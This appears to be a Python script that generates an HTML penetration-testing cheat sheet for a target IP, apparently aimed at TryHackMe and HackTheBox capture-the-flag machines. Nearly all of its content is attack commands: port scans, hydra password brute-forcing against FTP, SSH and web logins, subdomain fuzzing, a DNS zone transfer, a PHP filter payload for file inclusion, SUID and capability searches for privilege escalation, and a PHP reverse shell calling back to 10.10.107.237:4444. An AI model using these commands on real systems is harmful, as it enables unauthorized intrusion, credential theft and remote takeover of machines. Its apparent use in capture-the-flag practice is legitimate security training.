import os
import webbrowser

# check if windows or linux
winn = os.environ.get("OS", "")
if os.name == "nt":
    print(f"you are using {winn}")
    desktop = os.path.join(os.path.join(os.environ["USERPROFILE"]), "Desktop")
    os.chdir(desktop)
    print("page will be saved in your Desktop")


print(os.getcwd())

userinput = input("Enter IP address :")

# a is HTML page code 
a = f"""
<html>
<body>
<p>&nbsp;</p>
<h2><strong>&lt;PORT SCAN&gt;</strong></h2>
<pre>
<code class="language-bash">nmap -sS -p- -v  {userinput}
 nmap -sU -v  {userinput}
rustscan -a {userinput} -- -A -sC</code></pre>
<p>&nbsp;</p>
<h2><strong>&lt;DIR Discovery &gt;</strong></h2>
<pre>
<code class="language-bash">gobuster dir -u http://{userinput} -w /usr/share/wordlists/dirb/big.txt -x .php,.zip,.txt,.html
hydra -t 1 -l michael -P /usr/share/wordlists/rockyou.txt -vV http://{userinput}/login.html ftp
hydra -t 1 -l smokey -P /usr/share/wordlists/rockyou.txt -vV {userinput} ssh
hydra -l adminaccount@itsupport.thm -P /usr/share/wordlists/rockyou.txt {userinput} http-post-form "/login:username=adminaccount@itsupport.thm&amp;password=^PASS^:Invalid Password!"</code></pre>
<h2><br />
<strong>&lt;find subdomains&gt;</strong></h2>
<pre>
<code class="language-bash">wfuzz -c --hw 977 -u http://contacttracer.thm -H "Host: FUZZ.contacttracer.thm " -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt</code></pre>
<p><strong>&lt;DNS if you have exposed DNS server&gt;</strong><br />
dig&nbsp; axfr&nbsp; @10.10.167.219 trick.htb</p>
<p><br />
&nbsp; <strong>&lt;PHP filter for LFI , getbase64 and decode the hash&gt;&nbsp;</strong>&nbsp; &nbsp;php://filter/convert.base64-encode/resource=config.php</p>
<h2>&nbsp;</h2>
<h2><strong>&nbsp;&lt;SNMP&gt;</strong></h2>
<pre>
<code class="language-bash">snmpwalk -c public -v2c -On {userinput}
snmpenum " + userinput + " public linux.txt</code></pre>
<h2><br />
<br />
<strong><span style="background-color:#f1c40f">&nbsp;&lt;&nbsp; </span><span style="color:#e74c3c"><span style="background-color:#f1c40f">STEP 2</span></span><span style="background-color:#f1c40f"> when you have access&gt;</span></strong><br />
<br />
<strong>&lt;CAP use this to check cabibilitys&gt;</strong></h2>
<p>use this to check cap&nbsp; :</p>
<pre>
<code class="language-bash">getcap -r / 2&gt;/dev/null</code></pre>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<h2>&nbsp; <strong>&lt;SHELL&gt;</strong><br />
&nbsp; &nbsp;&nbsp; &nbsp;revshell.com<br />
<span style="color:#e74c3c">&nbsp;</span></h2>
<pre>
<code class="language-bash"> python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
<h2><br />
&nbsp; &nbsp;&nbsp; php reverse shell</h2>
<pre>
<code class="language-bash"> php -r '$sock=fsockopen("10.10.107.237",4444);$proc=proc_open("sh", array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);'</code></pre>
<p>&nbsp;</p>
<p><strong>&lt;find SUID&gt;</strong></p>
<pre>
<code class="language-bash">  find / -perm -u=s -type f 2&gt;/dev/null</code></pre>
<p>&nbsp;&nbsp;</p>
<p><br />
&nbsp;i like this ====&gt;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;</p>
<pre>
<code class="language-bash"> find / -perm -u=s -type f 2&gt;/dev/null; find / -perm -4000 -o- -perm -2000 -o- -perm -6000</code></pre>
<p><br />
<span style="font-size:14px"><strong><span style="background-color:#c0392b">DONE</span></strong></span></p>
<p>&nbsp;</p>
</body>
</html>
"""


# create HTML page and display result
file = open("myfile.html", "w", encoding="utf-8")
file.write(a)
file.close()

webbrowser.open("file://" + os.getcwd() + "/myfile.html")
print("\n page generated succesfully..\n ")
input("Press Enter to close...")
